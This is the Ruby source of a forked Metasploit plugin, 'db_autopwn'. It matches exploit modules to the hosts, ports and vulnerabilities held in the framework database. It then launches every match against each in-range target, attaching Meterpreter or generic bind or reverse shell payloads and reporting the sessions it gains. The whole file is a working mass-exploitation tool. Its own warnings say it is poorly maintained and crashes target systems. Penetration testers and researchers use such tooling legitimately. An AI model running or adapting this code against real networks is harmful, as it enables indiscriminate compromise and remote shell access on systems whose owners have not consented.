#
# db_autopwn - stripped from previous db commands and modified into a plugin as autopwn has been
#		pulled from the mainline release.
#
#		Issues/Bugs should go to neinwechter via GitHub
#


module Msf

class Plugin::DBAutopwn < Msf::Plugin
	class DBAutopwnCommandDispatcher
		include Msf::Ui::Console::CommandDispatcher

		#
		# Constants
		#

		PWN_SHOW = 2**0
		PWN_XREF = 2**1
		PWN_PORT = 2**2
		PWN_EXPL = 2**3
		PWN_SING = 2**4
		PWN_SLNT = 2**5
		PWN_VERB = 2**6

		def name
			"db_autopwn"
		end

		def commands
			{
				"db_autopwn" => "Automatically exploit everything",
			}
		end

		#
		# Returns true if the db is connected, prints an error and returns
		# false if not.
		#
		# All commands that require an active database should call this before
		# doing anything.
		#
		def active?
			if not framework.db.active
				print_error("Database not connected")
				return false
			end
			true
		end

		#
		# A shotgun approach to network-wide exploitation
		# Officially deprecated as of 4.1
		#
		# Forked for those who still want it and understand it's limitations/issues
		#

		def cmd_db_autopwn(*args)
			return unless active?

			print_error("")
			print_error("Warning: The db_autopwn command is not officially supported and exists only in a branch.")
			print_error("         This code is not well maintained, crashes systems, and crashes itself.")
			print_error("         Use only if you understand it's current limitations/issues.")
			print_error("         Minimal support and development via neinwechter on GitHub metasploit fork.")
			print_error("")

			stamp = Time.now.to_f
			vcnt  = 0
			rcnt  = 0
			mode  = 0
			code  = :bind
			mjob  = 5
			regx  = nil
			minrank = nil
			maxtime = 120

			port_inc = []
			port_exc = []

			targ_inc = []
			targ_exc = []

			args.push("-h") if args.length == 0

			while (arg = args.shift)
				case arg
				when '-t'
					mode |= PWN_SHOW
				when '-x'
					mode |= PWN_XREF
				when '-p'
					mode |= PWN_PORT
				when '-e'
					mode |= PWN_EXPL
				when '-s'
					mode |= PWN_SING
				when '-q'
					mode |= PWN_SLNT
				when '-v'
					mode |= PWN_VERB
				when '-j'
					mjob = args.shift.to_i
				when '-r'
					code = :conn
				when '-b'
					code = :bind
				when '-I'
					tmpopt = OptAddressRange.new('TEMPRANGE', [ true, '' ])
					range = args.shift
					if not tmpopt.valid?(range)
						print_error("Invalid range for -I")
						return
					end
					targ_inc << Rex::Socket::RangeWalker.new(tmpopt.normalize(range))
				when '-X'
					tmpopt = OptAddressRange.new('TEMPRANGE', [ true, '' ])
					range = args.shift
					if not tmpopt.valid?(range)
						print_error("Invalid range for -X")
						return
					end
					targ_exc << Rex::Socket::RangeWalker.new(tmpopt.normalize(range))
				when '-PI'
					port_inc = Rex::Socket.portspec_to_portlist(args.shift)
				when '-PX'
					port_exc = Rex::Socket.portspec_to_portlist(args.shift)
				when '-m'
					regx = args.shift
				when '-R'
					minrank = args.shift
				when '-T'
					maxtime = args.shift.to_f
				when '-h','--help'
					print_status("Usage: db_autopwn [options]")
					print_line("\t-h          Display this help text")
					print_line("\t-t          Show all matching exploit modules")
					print_line("\t-x          Select modules based on vulnerability references")
					print_line("\t-p          Select modules based on open ports")
					print_line("\t-e          Launch exploits against all matched targets")
#					print_line("\t-s          Only obtain a single shell per target system (NON-FUNCTIONAL)")
					print_line("\t-r          Use a reverse connect shell")
					print_line("\t-b          Use a bind shell on a random port (default)")
					print_line("\t-q          Disable exploit module output")
					print_line("\t-R  [rank]  Only run modules with a minimal rank")
					print_line("\t-I  [range] Only exploit hosts inside this range")
					print_line("\t-X  [range] Always exclude hosts inside this range")
					print_line("\t-PI [range] Only exploit hosts with these ports open")
					print_line("\t-PX [range] Always exclude hosts with these ports open")
					print_line("\t-m  [regex] Only run modules whose name matches the regex")
					print_line("\t-T  [secs]  Maximum runtime for any exploit in seconds")
					print_line("")
					return
				end
			end

			minrank = minrank || framework.datastore['MinimumRank'] || 'manual'
			if ! RankingName.values.include?(minrank)
				print_error("MinimumRank invalid!  Possible values are (#{RankingName.sort.map{|r|r[1]}.join("|")})")
				wlog("MinimumRank invalid, ignoring", 'core', LEV_0)
				return
			else
				minrank = RankingName.invert[minrank]
			end

			# Default to quiet mode
			if (mode & PWN_VERB == 0)
				mode |= PWN_SLNT
			end

			matches    = {}
			refmatches = {}

			# Pre-allocate a list of references and ports for all exploits
			mrefs  = {}
			mports = {}
			mservs = {}

			# A list of jobs we spawned and need to wait for
			autopwn_jobs = []

			[ [framework.exploits, 'exploit' ], [ framework.auxiliary, 'auxiliary' ] ].each do |mtype|
				mtype[0].each_module do |modname, mod|
					o = mod.new

					if(mode & PWN_XREF != 0)
						o.references.each do |r|
							next if r.ctx_id == 'URL'
							ref = r.ctx_id + "-" + r.ctx_val
							ref.upcase!

							mrefs[ref] ||= {}
							mrefs[ref][o.fullname] = o
						end
					end

					if(mode & PWN_PORT != 0)
						if(o.datastore['RPORT'])
							rport = o.datastore['RPORT']
							mports[rport.to_i] ||= {}
							mports[rport.to_i][o.fullname] = o
						end

						if(o.respond_to?('autofilter_ports'))
							o.autofilter_ports.each do |rport|
								mports[rport.to_i] ||= {}
								mports[rport.to_i][o.fullname] = o
							end
						end

						if(o.respond_to?('autofilter_services'))
							o.autofilter_services.each do |serv|
								mservs[serv] ||= {}
								mservs[serv][o.fullname] = o
							end
						end
					end
				end
			end


			begin

			framework.db.hosts.each do |host|
				xhost = host.address
				next if (targ_inc.length > 0 and not range_include?(targ_inc, xhost))
				next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))

				if(mode & PWN_VERB != 0)
					print_status("Scanning #{xhost} for matching exploit modules...")
				end

				#
				# Match based on vulnerability references
				#
				if (mode & PWN_XREF != 0)

					host.vulns.each do |vuln|

						# Faster to handle these here
						serv = vuln.service
						xport = xprot = nil

						if(serv)
							xport = serv.port
							xprot = serv.proto
						end

						vuln.refs.each do |ref|
							mods = mrefs[ref.name.upcase] || {}
							mods.each_key do |modname|
								mod = mods[modname]
								next if minrank and minrank > mod.rank
								next if (regx and mod.fullname !~ /#{regx}/)

								if(xport)
									next if (port_inc.length > 0 and not port_inc.include?(serv.port.to_i))
									next if (port_exc.length > 0 and port_exc.include?(serv.port.to_i))
								else
									if(mod.datastore['RPORT'])
										next if (port_inc.length > 0 and not port_inc.include?(mod.datastore['RPORT'].to_i))
										next if (port_exc.length > 0 and port_exc.include?(mod.datastore['RPORT'].to_i))
									end
								end

								next if (regx and mod.fullname !~ /#{regx}/)

								mod.datastore['RPORT'] = xport if xport
								mod.datastore['RHOST'] = xhost

								filtered = false
								begin
									::Timeout.timeout(2, ::RuntimeError) do
										filtered = true if not mod.autofilter()
									end
								rescue ::Interrupt
									raise $!
								rescue ::Timeout::Error
									filtered = true
								rescue ::Exception
									filtered = true
								end
								next if filtered

								matches[[xport,xprot,xhost,mod.fullname]]=true
								refmatches[[xport,xprot,xhost,mod.fullname]] ||= []
								refmatches[[xport,xprot,xhost,mod.fullname]] << ref.name
							end
						end
					end
				end

				#
				# Match based on open ports
				#
				if (mode & PWN_PORT != 0)
					host.services.each do |serv|
						next if not serv.host
						next if (serv.state != ServiceState::Open)

						xport = serv.port.to_i
						xprot = serv.proto
						xname = serv.name

						next if xport == 0

						next if (port_inc.length > 0 and not port_inc.include?(xport))
						next if (port_exc.length > 0 and port_exc.include?(xport))

						mods = mports[xport.to_i] || {}

						mods.each_key do |modname|
							mod = mods[modname]
							next if minrank and minrank > mod.rank
							next if (regx and mod.fullname !~ /#{regx}/)
							mod.datastore['RPORT'] = xport
							mod.datastore['RHOST'] = xhost

							filtered = false
							begin
								::Timeout.timeout(2, ::RuntimeError) do
									filtered = true if not mod.autofilter()
								end
							rescue ::Interrupt
								raise $!
							rescue ::Exception
								filtered = true
							end

							next if filtered
							matches[[xport,xprot,xhost,mod.fullname]]=true
						end

						mods = mservs[xname] || {}
						mods.each_key do |modname|
							mod = mods[modname]
							next if minrank and minrank > mod.rank
							next if (regx and mod.fullname !~ /#{regx}/)
							mod.datastore['RPORT'] = xport
							mod.datastore['RHOST'] = xhost

							filtered = false
							begin
								::Timeout.timeout(2, ::RuntimeError) do
									filtered = true if not mod.autofilter()
								end
							rescue ::Interrupt
								raise $!
							rescue ::Exception
								filtered = true
							end

							next if filtered
							matches[[xport,xprot,xhost,mod.fullname]]=true
						end
					end
				end
			end

			rescue ::Exception => e
				print_status("ERROR: #{e.class} #{e} #{e.backtrace}")
				return
			end

			if (mode & PWN_SHOW != 0)
				print_status("Analysis completed in #{(Time.now.to_f - stamp).to_i} seconds (#{vcnt} vulns / #{rcnt} refs)")
				print_status("")
				print_status("=" * 80)
				print_status(" " * 28 + "Matching Exploit Modules")
				print_status("=" * 80)

				matches.each_key do |xref|
					mod = nil
					if ((mod = framework.modules.create(xref[3])) == nil)
						print_status("Failed to initialize #{xref[3]}")
						next
					end

					if (mode & PWN_SHOW != 0)
						tport = xref[0] || mod.datastore['RPORT']
						if(refmatches[xref])
							print_status("  #{xref[2]}:#{tport}  #{xref[3]}  (#{refmatches[xref].join(", ")})")
						else
							print_status("  #{xref[2]}:#{tport}  #{xref[3]}  (port match)")
						end
					end

				end
				print_status("=" * 80)
				print_status("")
				print_status("")
			end

			ilog("db_autopwn: Matched #{matches.length} modules")

			idx = 0
			matches.each_key do |xref|

				idx += 1

				begin
					mod = nil

					if ((mod = framework.modules.create(xref[3])) == nil)
						print_status("Failed to initialize #{xref[3]}")
						next
					end

					#
					# The code is just a proof-of-concept and will be expanded in the future
					#
					if (mode & PWN_EXPL != 0)

						mod.datastore['RHOST'] = xref[2]

						if(xref[0])
							mod.datastore['RPORT'] = xref[0].to_s
						end

						if (code == :bind)
							mod.datastore['LPORT']   = (rand(0x8fff) + 4000).to_s
							if(mod.fullname =~ /\/windows\//)
								mod.datastore['PAYLOAD'] = 'windows/meterpreter/bind_tcp'
							else
								mod.datastore['PAYLOAD'] = 'generic/shell_bind_tcp'
							end
						end

						if (code == :conn)
							mod.datastore['LHOST']   = 	Rex::Socket.source_address(xref[2])
							mod.datastore['LPORT']   = 	(rand(0x8fff) + 4000).to_s

							if (mod.datastore['LHOST'] == '127.0.0.1')
								print_status("Failed to determine listener address for target #{xref[2]}...")
								next
							end

							if(mod.fullname =~ /\/windows\//)
								mod.datastore['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
							else
								mod.datastore['PAYLOAD'] = 'generic/shell_reverse_tcp'
							end
						end


						if(framework.jobs.keys.length >= mjob)
							print_status("Job limit reached, waiting on modules to finish...")
							while(framework.jobs.keys.length >= mjob)
								::IO.select(nil, nil, nil, 0.25)
							end
						end

						print_status("(#{idx}/#{matches.length} [#{framework.sessions.length} sessions]): Launching #{xref[3]} against #{xref[2]}:#{mod.datastore['RPORT']}...")

						autopwn_jobs << framework.threads.spawn("AutoPwnJob#{xref[3]}", false, mod) do |xmod|
							begin
							stime = Time.now.to_f
							::Timeout.timeout(maxtime) do
									inp = (mode & PWN_SLNT != 0) ? nil : driver.input
									out = (mode & PWN_SLNT != 0) ? nil : driver.output

									case xmod.type
									when MODULE_EXPLOIT
										xmod.exploit_simple(
											'Payload'        => xmod.datastore['PAYLOAD'],
											'LocalInput'     => inp,
											'LocalOutput'    => out,
											'RunAsJob'       => false)
									when MODULE_AUX
										xmod.run_simple(
											'LocalInput'     => inp,
											'LocalOutput'    => out,
											'RunAsJob'       => false)
									end
								end

							rescue ::Timeout::Error
								print_status(" >> autopwn module timeout from #{xmod.fullname} after #{Time.now.to_f - stime} seconds")
							rescue ::Exception
								print_status(" >> autopwn exception during launch from #{xmod.fullname}: #{$!} ")
							end
						end
					end

				rescue ::Interrupt
					raise $!

				rescue ::Exception
					print_status(" >> autopwn exception from #{xref[3]}: #{$!} #{$!.backtrace}")
				end
			end

			# Wait on all the jobs we just spawned
			while (not autopwn_jobs.empty?)
				# All running jobs are stored in framework.jobs.  If it's
				# not in this list, it must have completed.
				autopwn_jobs.delete_if { |j| not j.alive? }

				print_status("(#{matches.length}/#{matches.length} [#{framework.sessions.length} sessions]): Waiting on #{autopwn_jobs.length} launched modules to finish execution...")
				::IO.select(nil, nil, nil, 5.0)
			end

			if (mode & PWN_SHOW != 0 and mode & PWN_EXPL != 0)
				print_status("The autopwn command has completed with #{framework.sessions.length} sessions")
				if(framework.sessions.length > 0)
					print_status("Enter sessions -i [ID] to interact with a given session ID")
					print_status("")
					print_status("=" * 80)
					driver.run_single("sessions -l -v")
					print_status("=" * 80)
				end
			end
			print_line("")
		# EOM
		end










##############################
##############################

	end

	def initialize(framework, opts)
		super
		add_console_dispatcher(DBAutopwnCommandDispatcher)
	end

	def cleanup
		remove_console_dispatcher('db_autopwn')
	end

	def name
		"db_autopwn"
	end

	def desc
		"Automatically exploit everything"
	end

end
end
